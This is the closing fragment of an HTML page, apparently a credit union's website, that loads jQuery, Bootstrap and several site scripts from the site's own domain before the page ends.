    <script type="text/javascript" src="https://www.ncsecu.org/Includes/jQuery/jquery-1.12.3.min.js"></script>
    <script type="text/javascript" src="https://www.ncsecu.org/Includes/Bootstrap/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="https://www.ncsecu.org/Includes/bootstrap-accessibility.js?ver=1.1"></script>
    <script type="text/javascript" src="https://www.ncsecu.org/Includes/Secu2017.js?ver=5.10"></script>
    <script type="text/javascript" src="https://www.ncsecu.org/Includes/Secu2017-home.js?ver=3.7"></script>
    <script type="text/javascript" src="https://www.ncsecu.org/Includes/redirect-externals.js?ver=1.2"></script>
	<script type="text/javascript" src="https://www.ncsecu.org/Includes/Info/InfoCommon.js?ver=1.0"></script>	
</body>
<!-- InstanceEnd --></html>